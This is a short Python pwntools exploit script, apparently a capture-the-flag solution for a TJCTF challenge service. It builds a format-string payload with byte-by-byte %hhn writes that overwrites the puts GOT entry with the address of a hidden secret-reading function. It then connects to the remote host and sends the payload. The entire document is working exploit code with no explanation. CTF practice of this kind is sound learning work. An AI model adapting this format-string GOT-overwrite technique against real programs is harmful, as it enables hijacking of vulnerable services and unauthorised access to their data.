from pwn import *
import ctypes

password = 'A'
PUTS_GOT = 0x804a028
GET_SECRET = 0x8048713

def fmtStr(addr, data, offset=35):
	payload = ''
	payload += p32(addr)
	payload += p32(addr+1)
	payload += p32(addr+2)
	payload += p32(addr+3)
	data0 = data & 0xff
	data1 = data >> 8 & 0xff
	data2 = data >> 16 & 0xff
	data3 = data >> 24 & 0xff
	a = ctypes.c_ubyte(data0-len(payload)).value
	payload += '%{}c%{}$hhn'.format(a, offset)
	b = ctypes.c_ubyte(data1-data0).value
	payload += '%{}c%{}$hhn'.format(b, offset+1)
	c = ctypes.c_ubyte(data2-data1).value
	payload += '%{}c%{}$hhn'.format(c, offset+2)
	d = ctypes.c_ubyte(data3-data2).value
	payload += '%{}c%{}$hhn'.format(d, offset+3)

	return payload

r = remote('problem1.tjctf.org', 8008)
r.recvuntil('> ')
r.sendline(password)
r.recvuntil('> ')
r.sendline(fmtStr(PUTS_GOT, GET_SECRET))
r.recvuntil('> ')
r.sendline(password)
print r.recvall()
